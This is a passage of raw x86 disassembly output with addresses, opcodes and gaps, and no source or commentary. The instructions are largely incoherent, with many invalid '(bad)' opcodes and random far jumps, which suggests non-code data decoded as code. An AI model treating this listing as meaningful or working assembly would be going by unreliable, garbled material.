  429718:	push   0xdb8922a4
  42971d:	leave  
  42971e:	pop    esp
  42971f:	idiv   BYTE PTR [ebp+0x56]
  429722:	sub    ecx,DWORD PTR [edx]
  429724:	pop    eax
  429725:	(bad)  
  429726:	aam    0xc6
  429728:	imul   BYTE PTR [eax*1+0x52d46741]
  42972f:	mov    BYTE PTR [ebx],ch
  429731:	or     ecx,edi
  429733:	jno    0x4296d2
  429735:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429736:	repz test eax,0x6de7a55c
  42973c:	xlat   BYTE PTR ds:[ebx]
  42973d:	loop   0x429779
  42973f:	mov    BYTE PTR [ebx-0x4d475848],dh
  429745:	inc    edi
  429746:	dec    ebp
  429747:	xor    DWORD PTR [edi+0xe],esp
  42974a:	push   0xfed8d48
  42974f:	lods   al,BYTE PTR ds:[esi]
  429750:	outs   dx,DWORD PTR ds:[esi]
  429751:	xor    BYTE PTR [edi-0x5],dl
  429754:	imul   edx,DWORD PTR [ebp+0x6930bed7],0x60
  42975b:	into   
  42975c:	and    ebp,eax
  42975e:	popf   
  42975f:	cmp    DWORD PTR [edx],esp
  429761:	fcom   DWORD PTR [esi+0x40efd6fa]
  429767:	mov    edi,0xd71afe43
  42976c:	retf   0xbc9b
  42976f:	mov    eax,ds:0x36dce327
  429774:	ins    BYTE PTR es:[edi],dx
  429775:	fisubr DWORD PTR [edi+0x1a]
  429778:	mov    eax,ds:0x5b878cf6
  42977d:	outs   dx,BYTE PTR gs:[esi]
  42977f:	ins    DWORD PTR es:[edi],dx
  429780:	inc    esi
  429781:	lods   eax,DWORD PTR ds:[esi]
  429782:	sbb    cl,BYTE PTR [eax+eiz*1+0x27]
  429786:	jb     0x429750
  429788:	out    0x7c,al
  42978a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42978b:	popf   
  42978c:	add    al,0x78
  42978e:	dec    ebp
  42978f:	and    DWORD PTR [eax+0x32115456],ecx
  429795:	jb     0x4297e4
  429797:	lds    ecx,FWORD PTR [ebp-0x85738b0]
  42979d:	sub    BYTE PTR [edx],0xb1
  4297a0:	jbe    0x429812
  4297a2:	cs ret 0xb973
  4297a6:	aas    
  4297a7:	cmp    BYTE PTR [ebx],cl
  4297a9:	shl    ch,0xd0
  4297ac:	lahf   
  4297ad:	lea    ebp,[ebx]
  4297af:	pop    ebp
  4297b0:	push   ebp
  4297b1:	mov    esi,0x62855fa8
  4297b6:	das    
  4297b7:	(bad)  
  4297b8:	das    
  4297b9:	sub    al,0xc4
  4297bb:	pop    eax
  4297bc:	adc    dh,al
  4297be:	xchg   esp,eax
  4297bf:	mov    eax,0xd1ab588
  4297c4:	sbb    al,0xc8
  4297c6:	bnd jae 0x429798
  4297c9:	jae    0x4297fb
  4297cb:	xchg   ebx,eax
  4297cc:	sub    al,dh
  4297ce:	push   ebp
  4297cf:	dec    ebx
  4297d0:	ret    0x2a48
  4297d3:	or     ecx,0xa7b65070
  4297d9:	adc    ecx,DWORD PTR [ebp+0x7027eab8]
  4297df:	std    
  4297e0:	repz and al,0x6e
  4297e3:	(bad)  [esi+edx*4-0x60]
  4297e7:	daa    
  4297e8:	or     eax,0x471bee24
	...
  429855:	add    BYTE PTR [eax],dh
  429857:	inc    edx
  429858:	fbld   TBYTE PTR [edx-0x1]
  42985b:	(bad)  
  42985c:	mov    ebp,0x1d164c52
  429861:	pop    ebp
  429862:	lds    edi,FWORD PTR [ebp+ebx*8-0x2]
  429866:	cmp    DWORD PTR [ecx+eax*1+0xff00],0x2501ff00
  429871:	dec    ecx
  429872:	lahf   
  429873:	cmc    
  429874:	mov    ds:0xb6cf97e5,eax
  429879:	imul   ecx,DWORD PTR [edx],0xc2d698ba
  42987f:	mov    BYTE PTR [ecx+eiz*8],cl
  429882:	sub    eax,0x1ac52788
  429887:	and    eax,0x13915eea
  42988c:	sub    DWORD PTR [esi+edx*1-0x1fe83393],edx
  429893:	xor    BYTE PTR [ebp+0x29],0xa3
  429897:	mov    al,ds:0x89bc1956
  42989c:	fsub   QWORD PTR [ebp-0x6b]
  42989f:	ror    DWORD PTR [esi+0x5d],0xc4
  4298a3:	dec    edx
  4298a4:	cdq    
  4298a5:	pop    ds
  4298a6:	jne    0x42987a
  4298a8:	stos   DWORD PTR es:[edi],eax
  4298a9:	rcl    eax,cl
  4298ab:	mov    BYTE PTR ss:[ebp-0x451da034],bh
  4298b2:	jmp    0x4c9b:0x79b416df
  4298b9:	in     al,dx
  4298ba:	add    al,0xdf
  4298bc:	stos   DWORD PTR es:[edi],eax
  4298bd:	fs inc edx
  4298bf:	ud2    
  4298c1:	ins    DWORD PTR es:[edi],dx
  4298c2:	xor    cl,BYTE PTR [eax-0x34da6613]
  4298c8:	cwde   
  4298c9:	in     al,dx
  4298ca:	pop    DWORD PTR [ecx-0x421f554b]
  4298d0:	jnp    0x429939
  4298d2:	xor    BYTE PTR [edi+0x18],0xf9
  4298d6:	hlt    
  4298d7:	cmp    BYTE PTR [edi+0x65b22234],dh
  4298dd:	pop    esp
  4298de:	add    BYTE PTR [ebx-0x65272c64],0xd9
  4298e5:	cs xor eax,0x11979141
  4298eb:	loop   0x429955
  4298ed:	stc    
  4298ee:	pop    ss
  4298ef:	cwde   
  4298f0:	mov    edx,0xbe0e915b
  4298f5:	mov    al,ds:0xbd262a23
  4298fa:	jo     0x429890
  4298fc:	xor    eax,0xd4ca1817
  429901:	daa    
  429902:	and    cl,BYTE PTR [eax+0x29]
  429905:	ror    BYTE PTR [esi],0x38
  429908:	mov    al,0x5e
  42990a:	shl    edx,0xe6
  42990d:	jb     0x429917
  42990f:	push   es
  429910:	mov    dl,0x10
  429912:	jle    0x42994b
  429914:	mov    bh,0xc9
  429916:	mov    ebx,0xcc16163d
  42991b:	(bad)  
  42991c:	jl     0x4298ef
  42991e:	xor    ebx,edx
  429920:	mov    edx,0xd2a9e4ac
  429925:	test   al,0xb6
  429927:	pushf  
  429928:	shl    DWORD PTR [edi+0x78ad4921],0x58
  42992f:	sub    dl,BYTE PTR [edi+0x49]
  429932:	inc    ecx
  429933:	and    eax,0x89e0f73d
  429938:	gs cmp al,0xfa
  42993b:	cli    
  42993c:	jl     0x4298f5
  42993e:	push   0xffffffd5
  429940:	jnp    0x4298cd
  429942:	mov    cl,0x38
  429944:	jmp    0x6f6122c7
  429949:	pushf  
  42994a:	ret    0xd843
  42994d:	lahf   
  42994e:	jmp    0x5f06:0x59d94bd4
  429955:	jg     0x42995e
  429957:	mov    bl,0x3d
  429959:	cmp    bh,0x10
  42995c:	push   es
  42995d:	xor    dh,BYTE PTR [esi+0x4]
  429960:	loop   0x42992d
  429962:	push   ebx
  429963:	jns    0x4298f7
  429965:	sub    BYTE PTR [ebp+0x21b7edac],0x80
  42996c:	sbb    al,BYTE PTR [eax]
	...
  4299d6:	push   edi
  4299d7:	push   0xdf7fdf64
  4299dc:	(bad)  
  4299dd:	call   0x3b7e6dd5
  4299e2:	fsub   QWORD PTR [ebp+eax*2+0x1bd802f]
  4299e9:	add    bh,bh
  4299eb:	add    BYTE PTR [eax],al
  4299ed:	add    BYTE PTR [ecx+0x61],ch
  4299f0:	jns    0x4299b1
  4299f2:	mov    esi,0x4fb01546
  4299f7:	cmp    eax,DWORD PTR [esi-0x5c72cd49]
  4299fd:	retf   0x6f82
  429a00:	sahf   
  429a01:	cmc    
  429a02:	dec    eax
  429a03:	sub    eax,DWORD PTR [edx-0x785dcf2f]
  429a09:	jbe    0x4299f3
  429a0b:	mov    gs,WORD PTR [ebx-0x294736a1]
  429a11:	pmulhuw mm1,QWORD PTR [edi-0x80]
  429a15:	dec    ebp
  429a16:	shl    BYTE PTR [edi],cl
  429a18:	sahf   
  429a19:	mov    dl,0x64
  429a1b:	fdivrp st(1),st
  429a1d:	std    
  429a1e:	mov    ebp,0x3d3ad0d6
  429a23:	ror    BYTE PTR ds:0xfc183c08,1
  429a29:	pop    ds
  429a2a:	in     eax,0x68
  429a2c:	idiv   BYTE PTR [edi-0x31]
  429a2f:	push   ds
  429a30:	fbstp  TBYTE PTR [ecx]
  429a32:	or     ecx,DWORD PTR ds:0xcae74f6f
  429a38:	sti    
  429a39:	test   eax,0xe186bd4a
  429a3e:	mov    ah,0xad
  429a40:	pop    es
  429a41:	push   DWORD PTR [eax+0x55]
  429a44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429a45:	dec    ecx
  429a46:	pop    ds
  429a47:	inc    ebp
  429a48:	mov    WORD PTR [ecx+eax*2],ds
  429a4b:	rol    ebp,cl
  429a4d:	jb     0x4299ef
  429a4f:	ins    DWORD PTR es:[edi],dx
  429a50:	sti    
  429a51:	push   ds
  429a52:	mov    edx,ebp
  429a54:	xchg   edx,eax
  429a55:	gs mov ebx,0xd0f82c3e
  429a5b:	cmp    al,0x6a
  429a5d:	rcr    BYTE PTR [edx],cl
  429a5f:	adc    BYTE PTR [edx],0x1e
  429a62:	or     eax,0x65842617
  429a67:	mov    dl,0xd5
  429a69:	data16 lods al,BYTE PTR ds:[esi]
  429a6b:	mov    BYTE PTR [edi+eax*1],cl
  429a6e:	lods   eax,DWORD PTR ds:[esi]
  429a6f:	(bad)  
  429a70:	cwde   
  429a71:	popf   
  429a72:	mov    ah,0x78
  429a74:	cld    
  429a75:	mov    eax,0x15ce541e
  429a7a:	push   ebx
  429a7b:	mov    DWORD PTR [esi-0x4951d56d],ebx
  429a81:	bound  ebp,QWORD PTR [eax-0x14d71bf]
  429a87:	mov    ecx,0x7782c849
  429a8c:	sbb    DWORD PTR [ecx+edx*1],ecx
  429a8f:	mov    ds:0x4494598a,eax
  429a94:	push   0xf44227a
  429a99:	sub    eax,0x622f84d7
  429a9e:	out    0xd1,eax
  429aa0:	outs   dx,BYTE PTR ds:[esi]
  429aa1:	data16 fisttp WORD PTR [eax+0x199b62ce]
  429aa8:	cmp    eax,0x82c39391
  429aad:	sbb    eax,0x5c71382a
  429ab2:	scas   eax,DWORD PTR es:[edi]
  429ab3:	mov    ch,0xa3
  429ab5:	jmp    0x429af0
  429ab7:	stos   BYTE PTR es:[edi],al
  429ab8:	(bad)  [ecx]
  429aba:	push   0x1e
  429abc:	sbb    ebp,DWORD PTR [edi]
  429abe:	(bad)  
  429abf:	push   ss
  429ac0:	sbb    eax,0x5ef7c927
  429ac5:	jnp    0x429b00
  429ac7:	retf   
  429ac8:	mov    ch,0x65
  429aca:	mov    dh,0x58
  429acc:	loope  0x429b45
  429ace:	imul   esp,DWORD PTR [ebx-0x2b],0x3c64798b
  429ad5:	bound  esi,QWORD PTR [ebx]
  429ad7:	retf   
  429ad8:	jle    0x429adb
  429ada:	push   es
  429adb:	cli    
  429adc:	ficom  DWORD PTR [ebx+0x7c]
  429adf:	cmp    esi,DWORD PTR [ecx+esi*2+0x2e]
  429ae3:	mov    ds:0xd813f77c,eax
  429ae8:	push   cs
  429ae9:	xor    BYTE PTR [esi+0x47],cl
  429aec:	fadd   QWORD PTR [eax]
	...
  429b56:	into   
  429b57:	std    
  429b58:	sti    
  429b59:	leave  
  429b5a:	sti    
  429b5b:	iret   
  429b5c:	(bad)  
  429b5d:	jmp    DWORD PTR ds:0x57a95667
  429b63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429b64:	pop    edx
  429b65:	bound  edi,QWORD PTR [edi-0x42]
  429b68:	add    DWORD PTR [eax],eax
  429b6a:	inc    DWORD PTR [eax]
  429b6c:	add    BYTE PTR [eax],al
  429b6e:	stc    
  429b6f:	aaa    
  429b70:	cld    
  429b71:	jne    0x429b74
  429b73:	test   eax,0xab1605cd
  429b78:	adc    dh,cl
  429b7a:	in     al,0xe
  429b7c:	ins    DWORD PTR es:[edi],dx
  429b7d:	push   cs
  429b7e:	aad    0x3b
  429b80:	dec    edi
  429b81:	xchg   DWORD PTR [edx],edi
  429b83:	ja     0x429bbb
  429b85:	and    BYTE PTR [ebx+0x46],dh
  429b88:	or     dh,BYTE PTR [esi]
  429b8a:	(bad)  
  429b8b:	test   edx,0xb0bdf403
  429b91:	xor    ecx,DWORD PTR [esi+ebx*2-0x51ded00d]
  429b98:	arpl   WORD PTR [eax-0x160a8061],ax
  429b9e:	add    edx,esp
  429ba0:	dec    esp
  429ba1:	add    esi,eax
  429ba3:	jg     0x429be5
  429ba5:	mov    ecx,0x15f406b
  429baa:	ins    DWORD PTR es:[edi],dx
  429bab:	cmp    eax,0xa6e026d4
  429bb0:	dec    ecx
  429bb1:	and    cl,BYTE PTR [esi+0x7b]
  429bb4:	in     eax,0xd8
  429bb6:	push   ds
  429bb7:	pop    edx
  429bb8:	adc    cl,BYTE PTR [ebx]
  429bba:	inc    ebp
  429bbb:	pusha  
  429bbc:	cmp    BYTE PTR [esi],dh
  429bbe:	inc    esi
  429bbf:	push   eax
  429bc0:	inc    eax
  429bc1:	mov    ch,0x69
  429bc3:	sub    ah,ah
  429bc5:	int    0xd1
  429bc7:	lock imul ecx,DWORD PTR [edi],0xaf62d90c
  429bce:	xchg   edx,eax
  429bcf:	mov    ch,0x53
  429bd1:	inc    edi
  429bd2:	dec    esi
  429bd3:	sti    
  429bd4:	jecxz  0x429b67
  429bd6:	pop    ecx
  429bd7:	int    0x1e
  429bd9:	xchg   BYTE PTR [ebp+eax*4+0x1a4ee954],bl
  429be0:	mov    edx,DWORD PTR [edi-0x55b70cbd]
  429be6:	jle    0x429bd6
  429be8:	daa    
  429be9:	jbe    0x429bce
  429beb:	mov    cl,0x72
  429bed:	sbb    al,0x23
  429bef:	daa    
  429bf0:	jcxz   0x429bb3
  429bf3:	add    BYTE PTR [ecx+0x5fcfb7a6],0x7
  429bfa:	mov    dl,0xbf
  429bfc:	mov    dh,0xab
  429bfe:	or     ebp,esp
  429c00:	cs xchg ebx,eax
  429c02:	add    al,0x1f
  429c04:	mov    eax,ds:0x254e9f10
  429c09:	cmc    
  429c0a:	ins    DWORD PTR es:[edi],dx
  429c0b:	or     edx,DWORD PTR [esi+0x72662763]
  429c11:	sub    esi,DWORD PTR [ebp+0x56]
  429c14:	enter  0x643d,0x88
  429c18:	scas   eax,DWORD PTR es:[edi]
  429c19:	daa    
  429c1a:	in     al,0xeb
  429c1c:	ror    DWORD PTR ds:0x74798d4a,0xd7
  429c23:	push   ss
  429c24:	and    eax,0x794c18fc
  429c29:	outs   dx,BYTE PTR ds:[esi]
  429c2a:	mov    cl,0xd4
  429c2c:	adc    eax,0x5054b281
  429c31:	dec    ecx
  429c32:	lock cmp al,0x9e
  429c35:	xchg   DWORD PTR [ebx+0x6a],ebp
  429c38:	pop    edi
  429c39:	icebp  
  429c3a:	sub    DWORD PTR [edi],eax
  429c3c:	adc    ebp,DWORD PTR [ecx-0x59986685]
  429c42:	or     ecx,DWORD PTR [eax]
  429c44:	pop    ebp
  429c45:	mov    esi,0x9915dc6
  429c4a:	sub    al,0x1a
  429c4c:	je     0x429c14
  429c4e:	add    DWORD PTR [ecx*2+0x5ba909bc],ebx
  429c55:	xlat   BYTE PTR ds:[ebx]
  429c56:	ins    DWORD PTR es:[edi],dx
  429c57:	mov    ebx,0xd282afc5
  429c5c:	jmp    0x73ba:0x35b5964f
  429c63:	sbb    BYTE PTR [ebp+0x1e],0x49
  429c67:	mov    bh,0x34
  429c69:	je     0x429c75
  429c6b:	mov    ds:0x6a,eax
	...
  429cd4:	add    BYTE PTR [eax],al
  429cd6:	mov    ds:0xb788a616,eax
  429cdb:	mov    eax,0x89413faf
  429ce0:	(bad)  
  429ce1:	xor    cl,al
  429ce3:	fstp   TBYTE PTR [eax]
  429ce5:	dec    ebp
  429ce6:	jle    0x429ca7
  429ce8:	add    DWORD PTR [eax],eax
  429cea:	inc    DWORD PTR [eax]
  429cec:	add    BYTE PTR [eax],al
  429cee:	call   0x59f590d1
  429cf3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429cf4:	pusha  
  429cf5:	ja     0x429d6a
  429cf7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429cf8:	out    dx,eax
  429cf9:	imul   edi,DWORD PTR [edi-0x1aab6b92],0x72
  429d00:	mov    ah,0x82
  429d02:	or     BYTE PTR [edi+0x1f],ch
  429d05:	jle    0x429d2f
  429d07:	adc    al,0x6d
  429d09:	pop    es
  429d0a:	ss es cmc 
  429d0d:	sets   BYTE PTR [ecx-0x26]
  429d11:	in     al,0x5f
  429d13:	mov    dh,0xb3
  429d15:	pop    eax
  429d16:	(bad)  
  429d17:	fld    DWORD PTR [esi+0x64]
  429d1a:	inc    ebp
  429d1b:	dec    ebx
  429d1c:	cli    
  429d1d:	mov    ecx,0x555d9291
  429d22:	in     al,dx
  429d23:	daa    
  429d24:	scas   eax,DWORD PTR es:[edi]
  429d25:	sti    
  429d26:	or     DWORD PTR [esi+0x7a],edx
  429d29:	adc    BYTE PTR [eax],bh
  429d2b:	(bad)  
  429d2f:	pop    ds
  429d30:	mov    WORD PTR [edi+0x75176ec5],?
  429d36:	into   
  429d37:	sbb    BYTE PTR [ebx-0x7079f910],dl
  429d3d:	stc    
  429d3e:	rcl    dl,0xa4
  429d41:	sub    al,0xec
  429d43:	test   BYTE PTR [ebp+ebp*2+0x69],ah
  429d47:	into   
  429d48:	jp     0x429cd1
  429d4a:	mov    DWORD PTR [ebx+0x2a4393cf],eax
  429d50:	and    eax,ecx
  429d52:	xlat   BYTE PTR ds:[ebx]
  429d53:	add    ebx,ecx
  429d55:	mov    ebp,0x711b60da
  429d5a:	jns    0x429dc6
  429d5c:	icebp  
  429d5d:	xor    ch,cl
  429d5f:	popa   
  429d60:	test   DWORD PTR [edx+ecx*1],esi
  429d63:	xor    al,0x25
  429d65:	imul   BYTE PTR [edi-0x7bc2e083]
  429d6b:	les    edi,FWORD PTR [esp+ecx*2-0x72a10783]
  429d72:	scas   eax,DWORD PTR es:[edi]
  429d73:	add    al,0x6e
  429d75:	in     eax,0x1f
  429d77:	je     0x429d7f
  429d79:	scas   eax,DWORD PTR es:[edi]
  429d7a:	inc    ebx
  429d7b:	xchg   ebp,eax
  429d7c:	add    al,0x53
  429d7e:	call   0x9a7099db
  429d83:	call   0xca91ec0b
  429d88:	test   al,0x97
  429d8a:	imul   eax,DWORD PTR [esp+edx*4+0x3f],0x16
  429d8f:	xchg   DWORD PTR [edi+esi*4+0x60],ecx
  429d93:	stc    
  429d94:	jg     0x429deb
  429d96:	ret    
  429d97:	jp     0x429d9a
  429d99:	sub    BYTE PTR [eax-0x5d933295],0x78
  429da0:	sbb    DWORD PTR [ebp+0x5a],esp
  429da3:	xor    DWORD PTR [edx+0x3f227c1c],ebx
  429da9:	fsub   QWORD PTR [ecx+0x1fc62ad4]
  429daf:	push   0x6e
  429db1:	push   ebx
  429db2:	mov    edx,ss
  429db4:	cmp    al,0x3e
  429db6:	je     0x429dfb
  429db8:	popf   
  429db9:	inc    esi
  429dba:	(bad)  
  429dbb:	rcl    BYTE PTR [edi],1
  429dbd:	pop    ebp
  429dbe:	add    DWORD PTR [ebp-0x72],edx
  429dc1:	adc    dl,0xc3
  429dc4:	pop    eax
  429dc5:	fdiv   DWORD PTR [ecx-0x6341e818]
  429dcb:	loope  0x429da9
  429dcd:	fs sbb al,0xf0
  429dd0:	iret   
  429dd1:	or     ch,ah
  429dd3:	adc    edx,ebx
  429dd5:	pop    ds
  429dd6:	sbb    ah,BYTE PTR [eax+eax*4+0x69de95b2]
  429ddd:	or     DWORD PTR [edx+ebx*4-0x2e5f92fa],esp
  429de4:	add    dl,BYTE PTR [eax+eax*1-0x3e2a1801]
  429deb:	in     al,dx
  429dec:	sbb    al,0x0
	...
  429e56:	fwait
  429e57:	mov    bh,0xc4
  429e59:	or     al,0xec
  429e5b:	jg     0x429e38
  429e5d:	mov    bh,0xe1
  429e5f:	sahf   
  429e60:	loop   0x429eca
  429e62:	aas    
  429e63:	pop    ebp
  429e64:	xchg   ebp,eax
  429e65:	cwde   
  429e66:	jge    0x429e28
  429e68:	add    DWORD PTR [eax],eax
  429e6a:	inc    DWORD PTR [eax]
  429e6c:	add    BYTE PTR [eax],al
  429e6e:	mov    dl,0xa6
  429e70:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  429e72:	jg     0x429e47
  429e74:	pop    edi
  429e75:	add    esi,ebp
  429e77:	mov    ebp,0xc11de80f
  429e7c:	jne    0x429ede
  429e7e:	jmp    0x6ee9c6e
  429e83:	sbb    DWORD PTR [ecx],esp
  429e85:	call   0xce1e:0xd969d7c4
  429e8c:	scas   al,BYTE PTR es:[edi]
  429e8d:	cwde   
  429e8e:	(bad)  
  429e90:	jmp    0x429e61
  429e92:	adc    al,0xf7
  429e94:	xchg   ecx,eax
  429e95:	mov    ecx,0xaa2bf83a
  429e9a:	adc    dh,ah
  429e9c:	lahf   
  429e9d:	xchg   ebp,eax
  429e9e:	(bad)  
  429e9f:	fidivr WORD PTR [ecx+ebp*2+0x32a555b5]
  429ea6:	push   ebx
  429ea7:	jns    0x429e42
  429ea9:	or     eax,0x171585b7
  429eae:	inc    esi
  429eaf:	sub    DWORD PTR [edi+0x8a3ef8b],edi
  429eb5:	test   DWORD PTR [ecx+0x36da1b66],ecx
  429ebb:	inc    ebp
  429ebc:	out    0x3,eax
  429ebe:	jnp    0x429f16
  429ec0:	add    bh,BYTE PTR [edi+0x2d9032c1]
  429ec6:	dec    ebp
  429ec7:	xchg   BYTE PTR ds:0xd833c0bb,bh
  429ecd:	cmp    ebx,DWORD PTR [edx+eax*4-0x80]
  429ed1:	dec    edx
  429ed2:	xchg   BYTE PTR [ecx-0x20],ah
  429ed5:	sub    al,0x19
  429ed7:	addr16 aad 0x86
  429eda:	jecxz  0x429f45
  429edc:	shl    BYTE PTR [edx-0x55],0x9a
  429ee0:	test   eax,0x1514afb9
  429ee5:	int    0xc5
  429ee7:	aas    
  429ee8:	inc    edx
  429ee9:	shl    DWORD PTR [ebx+0x33],0xb
  429eed:	xchg   esp,eax
  429eee:	mov    ecx,0xcd4e5aad
  429ef3:	or     DWORD PTR [edx+0x3efa2c23],ecx
  429ef9:	inc    ecx
  429efa:	fs ss pop esi
  429efd:	sahf   
  429efe:	xor    ebx,DWORD PTR [esi]
  429f00:	mov    al,ds:0x9117fa94
  429f05:	not    DWORD PTR [ebx]
  429f07:	sub    BYTE PTR [ecx],al
  429f09:	ss pop ebx
  429f0b:	dec    edi
  429f0c:	ins    BYTE PTR es:[edi],dx
  429f0d:	sub    esp,DWORD PTR [ecx+0x31a1ec1b]
  429f13:	inc    esi
  429f14:	bound  esp,QWORD PTR [ebx-0x4bd46bf1]
  429f1a:	mov    edx,DWORD PTR [eax+0x39]
  429f1d:	push   0x50121a84
  429f22:	sbb    dl,al
  429f24:	dec    esp
  429f25:	xchg   ebp,eax
  429f26:	mov    ds:0x632bf10e,al
  429f2b:	stc    
  429f2c:	pop    esp
  429f2d:	xchg   esp,eax
  429f2e:	add    BYTE PTR [eax+ebx*4+0x4c],al
  429f32:	sub    eax,0xe26c66f
  429f37:	ret    
  429f38:	mov    ah,0xeb
  429f3a:	mov    bl,0x71
  429f3c:	(bad)  
  429f3d:	clc    
  429f3e:	lods   eax,DWORD PTR ds:[esi]
  429f3f:	aad    0xec
  429f41:	mov    al,0xbc
  429f43:	dec    eax
  429f44:	ss jmp 0x429ee6
  429f47:	sub    cl,BYTE PTR ds:0x6d907d97
  429f4d:	and    edx,ebx
  429f4f:	mov    ebp,0x94d51ac0
  429f54:	add    ch,bl
  429f56:	xchg   ebp,eax
  429f57:	shl    BYTE PTR [ebp+esi*4-0xa],1
  429f5b:	cmp    al,0x99
  429f5d:	icebp  
  429f5e:	dec    eax
  429f5f:	xchg   ebp,eax
  429f60:	pop    es
  429f61:	mov    ch,0x64
  429f63:	ja     0x429f67
  429f65:	(bad)  
  429f66:	xlat   BYTE PTR ds:[ebx]
  429f67:	push   0xe7bbc4f2
  429f6c:	xor    al,0x0
	...
  429fd6:	xor    DWORD PTR [ebp-0x38],eax
  429fd9:	push   es
  429fda:	cld    
  429fdb:	(bad)  
  429fdc:	push   DWORD PTR [edi-0x50]
  429fdf:	cld    
  429fe0:	sbb    esp,DWORD PTR [ebx-0x11933822]
  429fe6:	jl     0x429fa9
  429fe8:	add    DWORD PTR [eax],eax
  429fea:	inc    DWORD PTR [eax]
  429fec:	add    BYTE PTR [eax],al
  429fee:	lahf   
  429fef:	mov    esi,0x8bb32822
  429ff4:	xchg   DWORD PTR [ecx],esp
  429ff6:	jbe    0x42a054
  429ff8:	cwde   
  429ff9:	jmp    0x1d97421d
  429ffe:	imul   ebx,DWORD PTR [edx-0x5672d2ab],0xdc73cc78
  42a008:	sbb    edx,ebp
  42a00a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a00b:	mov    dl,0x40
  42a00d:	shl    edi,1
  42a00f:	je     0x42a002
  42a011:	jno    0x429fe8
  42a013:	int3   
  42a014:	dec    esi
  42a015:	sub    edx,DWORD PTR [eax]
  42a017:	shl    DWORD PTR [ebx],1
  42a019:	mov    edx,0xca8d3637
  42a01e:	rcr    BYTE PTR [edi-0x3c],cl
  42a021:	mov    DWORD PTR [ebp-0x11],edi
  42a024:	add    ebx,DWORD PTR [edi-0x5238b519]
  42a02a:	mov    bh,dh
  42a02c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a02d:	shr    al,0x38
  42a030:	push   ds
  42a031:	and    ebx,ebp
  42a033:	popa   
  42a034:	cld    
  42a035:	jle    0x42a09a
  42a037:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a038:	stc    
  42a039:	pop    ecx
  42a03a:	sbb    eax,0x21c2cae
  42a03f:	mov    DWORD PTR [eax],eax
  42a041:	xchg   edi,eax
  42a042:	mov    esi,0xbc07e39a
  42a047:	add    DWORD PTR [eax-0x1ede2f6c],ecx
  42a04d:	or     esi,DWORD PTR [edx]
  42a04f:	add    bh,dh
  42a051:	mov    ch,0x20
  42a053:	pop    esp
  42a054:	cli    
  42a055:	jge    0x42a002
  42a057:	daa    
  42a058:	cld    
  42a059:	hlt    
  42a05a:	push   es
  42a05b:	mov    al,0xd4
  42a05d:	inc    esi
  42a05e:	(bad)  
  42a05f:	data16 sahf 
  42a061:	(bad)  
  42a062:	shl    BYTE PTR [esi+0x37],cl
  42a065:	fcom   QWORD PTR [ecx]
  42a067:	xor    eax,0xc0d60a07
  42a06c:	aaa    
  42a06d:	aad    0xa6
  42a06f:	xchg   BYTE PTR [eax],bl
  42a071:	(bad)  
  42a072:	dec    DWORD PTR [eax]
  42a074:	inc    DWORD PTR [edi+0x2d]
  42a077:	inc    eax
  42a078:	inc    ebx
  42a079:	sbb    BYTE PTR [eax+0x64f176c9],dh
  42a07f:	pop    ecx
  42a080:	sub    al,0xf7
  42a082:	and    esp,edx
  42a084:	ror    DWORD PTR [ecx-0x35],1
  42a087:	(bad)  
  42a088:	in     al,dx
  42a089:	sbb    ebp,0x53
  42a08c:	xor    ecx,ebp
  42a08e:	push   esi
  42a08f:	outs   dx,BYTE PTR ds:[esi]
  42a090:	clc    
  42a091:	mov    al,ds:0x2dd2dfa4
  42a096:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a097:	jp     0x42a086
  42a099:	mov    dh,0xb
  42a09b:	ins    DWORD PTR es:[edi],dx
  42a09c:	shr    esp,cl
  42a09e:	xchg   esp,eax
  42a09f:	test   cl,ch
  42a0a1:	sbb    bl,BYTE PTR [eax-0x6d]
  42a0a4:	loop   0x42a0cc
  42a0a6:	mov    esp,eax
  42a0a8:	ficom  DWORD PTR [eax]
  42a0aa:	xlat   BYTE PTR ds:[ebx]
  42a0ab:	sub    BYTE PTR [edx-0x7a],bl
  42a0ae:	push   ss
  42a0af:	and    edi,DWORD PTR [ebp+0x26]
  42a0b2:	jo     0x42a12f
  42a0b4:	xor    BYTE PTR [ecx+edi*8-0xe56ced7],0xbe
  42a0bc:	adc    DWORD PTR [ecx-0x39],ebx
  42a0bf:	in     eax,dx
  42a0c0:	or     ebp,ebx
  42a0c2:	retf   0x25c7
  42a0c5:	addr16 push eax
  42a0c7:	and    eax,0x8f7508d6
  42a0cc:	sbb    eax,0x96d917af
  42a0d1:	adc    BYTE PTR [ebp-0x51e5aed5],al
  42a0d7:	add    BYTE PTR [edi],dh
  42a0d9:	(bad)  
  42a0da:	cli    
  42a0db:	cmp    al,0xc6
  42a0dd:	repnz test DWORD PTR [edx+0x39],ecx
  42a0e1:	xor    ebp,DWORD PTR [edx]
  42a0e3:	lods   eax,DWORD PTR ds:[esi]
  42a0e4:	fisub  WORD PTR [ebx+0x64]
  42a0e7:	xchg   edx,eax
  42a0e8:	adc    eax,0x229adf6f
	...
  42a155:	add    bh,dl
  42a157:	pushf  
  42a158:	shr    BYTE PTR [ebp-0x1000235],0xdb
  42a15f:	call   FWORD PTR [ebx]
  42a161:	mov    BYTE PTR [edx+0x7b521da7],0xc2
  42a168:	add    DWORD PTR [eax],eax
  42a16a:	inc    DWORD PTR [eax]
  42a16c:	add    BYTE PTR [eax],al
  42a16e:	pop    esp
  42a16f:	inc    edi
  42a170:	(bad)  
  42a171:	fcmovb st,st(7)
  42a173:	mov    ebx,0x3e536541
  42a178:	jp     0x42a1e3
  42a17a:	cmp    DWORD PTR [ebx+0x7e3b0675],edi
  42a180:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a181:	jmp    0xffda:0xd38905fd
  42a188:	jecxz  0x42a15a
  42a18a:	(bad)  
  42a18b:	jmp    0x42a1b9
  42a18d:	cmp    al,0x90
  42a18f:	outs   dx,BYTE PTR ds:[esi]
  42a190:	add    ah,bl
  42a192:	ret    
  42a193:	test   BYTE PTR [ebx+0x1],0xff
  42a197:	or     al,0x78
  42a199:	and    dh,ah
